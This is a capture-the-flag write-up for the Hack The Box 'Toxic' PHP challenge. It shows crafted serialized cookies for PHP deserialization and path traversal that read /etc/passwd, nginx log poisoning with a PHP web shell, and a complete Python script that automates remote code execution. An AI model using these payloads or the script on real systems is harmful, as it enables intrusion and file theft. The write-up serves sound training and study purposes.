---
layout: post
author: H4
---

# introduction
![bookstore](/images/htb_challenge_toxic.png)  

When starting the instance you are getting a simple website.
![bookstore](/images/htb_challenge_toxic_website.png)  

Additionally you can download the source code of the application. It is provided as a docker instance.

---
# vulnerability
As we have the source code of the application, the best practice here is to start by analysing the code for vulnerabilities. The application is small and does not have any useful features, but the code of the `index.php` catches our attention.

```php
<?php
spl_autoload_register(function ($name){
    if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

if (empty($_COOKIE['PHPSESSID']))
{
    $page = new PageModel;
    $page->file = '/www/index.html';

    setcookie(
        'PHPSESSID', 
        base64_encode(serialize($page)), 
        time()+60*60*24, 
        '/'
    );
} 

$cookie = base64_decode($_COOKIE['PHPSESSID']);
unserialize($cookie);
```

> The last two lines look juicy as they use the `unserialize` method. This can be exploited via a simple deserialisation attack.
{: .prompt-info }

---

# setting up the testing environment
To not mess with the live target, and as we have the source code of the application we fire up the provided `docker` instance to mess around locally before exploiting the live target.

```bash
$ sudo ./build-docker.sh
Sending build context to Docker daemon  1.198MB
Step 1/13 : FROM alpine:3.13
...
2023-09-21 10:11:18,565 INFO success: nginx entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
2023-09-21 10:11:18,566 INFO success: fpm entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
```

> Our local instance of the application listens on `localhost` on port `1337`
{: .prompt-info }

---

# exploiting the vulnerability
## manual exploitation
Lets start by accessing the local test application.
```http
GET / HTTP/1.1
Host: 127.0.0.1:1337
sec-ch-ua: "Chromium";v="117", "Not;A=Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9
Connection: close

HTTP/1.1 200 OK
Server: nginx
Date: Thu, 21 Sep 2023 09:27:16 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.4.26
Content-Length: 7665

<html>
...
```

From the source code of the application we know that the cookie `PHPSESSID` gets unserialised, so lets decode the value.
```bash
$ echo "Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9" | base64 -d
O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}
```

To exploit it, we just need to change `/www/index.html` to the file we desire and update the length variable (`s:15`).
  
Lets try to read `/etc/passwd` as a proof of concept.  
  
Crafted serialised object: `O:9:"PageModel":1:{s:4:"file";s:28:"../../../../../../etc/passwd";}`  
  
`base64` encoded serialised object: `Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyODoiLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCI7fQ==`
```http
GET / HTTP/1.1
Host: 127.0.0.1:1337
sec-ch-ua: "Chromium";v="117", "Not;A=Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyODoiLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCI7fQ==
Connection: close

HTTP/1.1 200 OK
Server: nginx
Date: Thu, 21 Sep 2023 09:32:52 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.4.26
Content-Length: 1262

root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
www:x:1000:1000:1000:/home/www:/bin/sh
nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin
```

> It worked!
{: .prompt-info }

Now lets escalate this file read vulnerability to a remote code execution by poisoning the `access.log` file. From the `docker` image and the `http` response we know that `nginx` is used. The `access.log` location should be under: `/var/log/nginx/access.log`.  
  
Crafted serialised object: `O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}`  
  
`base64` encoded serialised object: `Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==`
```http
GET / HTTP/1.1
Host: 127.0.0.1:1337
sec-ch-ua: "Chromium";v="117", "Not;A=Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==
Connection: close

HTTP/1.1 200 OK
Server: nginx
Date: Thu, 21 Sep 2023 09:35:59 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.4.26
Content-Length: 5687

172.17.0.1 - 200 "GET / HTTP/1.1" "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
...
```

> We are able to read the `access.log`
{: .prompt-info }

Lets poison the log with some simple `php` web shell.  
payload: `<?php system($_REQUEST['c']); ?>`
```http
GET / HTTP/1.1
Host: 127.0.0.1:1337
sec-ch-ua: "Chromium";v="117", "Not;A=Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: <?php system($_REQUEST['c']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9
Connection: close
```

Check if code execution works.
```http
GET /?c=id HTTP/1.1
Host: 127.0.0.1:1337
sec-ch-ua: "Chromium";v="117", "Not;A=Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==
Connection: close

HTTP/1.1 200 OK
Server: nginx
Date: Thu, 21 Sep 2023 09:38:00 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.4.26
Content-Length: 6245

172.17.0.1 - 200 "GET / HTTP/1.1" "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36" 
...
172.17.0.1 - 200 "GET / HTTP/1.1" "-" "uid=1000(www) gid=1000(www) groups=1000(www)
...
```

> Yay! It does.
{: .prompt-info }

When analysing the source of the target we also recognise that the flag file is randomised.
```bash
$ cat entrypoint.sh 
#!/bin/ash

# Secure entrypoint
chmod 600 /entrypoint.sh

# Generate random flag filename
mv /flag /flag_`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1`

exec "$@"
```

So in the next step we use our code execution to get the name of the flag.  
payload: `ls ../`
```http
GET /?c=ls+../ HTTP/1.1
Host: 127.0.0.1:1337
sec-ch-ua: "Chromium";v="117", "Not;A=Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==
Connection: close

HTTP/1.1 200 OK
Server: nginx
Date: Thu, 21 Sep 2023 10:10:40 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.4.26
Content-Length: 477

172.17.0.1 - 200 "GET / HTTP/1.1" "-" "bin
dev
entrypoint.sh
etc
flag_lBfIt
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
www
" 

```

> Flag name is `flag_lBfIt`
{: .prompt-info }

Now lets get the flag.  
payload: `cat ../flag_lBfIt`
```http
GET /?c=cat+../flag_lBfIt HTTP/1.1
Host: 127.0.0.1:1337
sec-ch-ua: "Chromium";v="117", "Not;A=Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==
Connection: close

HTTP/1.1 200 OK
Server: nginx
Date: Thu, 21 Sep 2023 09:46:41 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.4.26
Content-Length: 10074

172.17.0.1 - 200 "GET / HTTP/1.1" "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36" 
...
172.17.0.1 - 200 "GET / HTTP/1.1" "-" "HTB{f4k3_fl4g_f0r_t3st1ng}
...
```

> We got the (fake) flag: `HTB{f4k3_fl4g_f0r_t3st1ng}`
{: .prompt-info }

We are now at the point that we know how to exploit the vulnerability and ready to do the same to the live target. To make it look a little bit more professional we write a simple exploit which automatically exploits the live target.

## automatic exploitation
### python exploit code
```python
import http.client
import sys

flagName = ""
flag = ""

host = sys.argv[1]
conn = http.client.HTTPConnection(host)

# poison log file
print("[*] Poisoning log file...")
conn.request("GET", "/", headers={"Host":host ,"User-Agent": "<?php system($_REQUEST['c']); ?>"})
response = conn.getresponse()
dump = response.read()

# identify file name via rce
print("[*] Locating flag file...")
conn.request("GET", "/?c=ls+../", headers={"Host":host ,"Cookie": "PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ=="})
response = conn.getresponse()
rText = str(response.read()).split("\\n")
for item in rText:
   if "flag_" in item and len(item.strip()) <= 10:
      flagName = item.strip()

# print flag content vi rce
print("[*] Getting flag...")
conn.request("GET", "/?c=cat+../" +  flagName, headers={"Host":host ,"Cookie": "PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ=="})
response = conn.getresponse()
rText = str(response.read()).split("\\n")
for item in rText:
   if "HTB{" in item and "}" in item:
      flag = item
      flag = flag.split(" ")
      for item2 in flag:
         if "HTB{" in item and "}" in item:
            flag = item2.replace("\"", "")

print(flag)
```

### exploit target
```bash
$ python3 exploit.py 206.189.121.78:31345
[*] Poisoning log file...
[*] Locating flag file...
[*] Getting flag...
HTB{P*********************!}
```

> Our exploit worked! We got the flag! 
{: .prompt-info }

Pwned! <@:-)
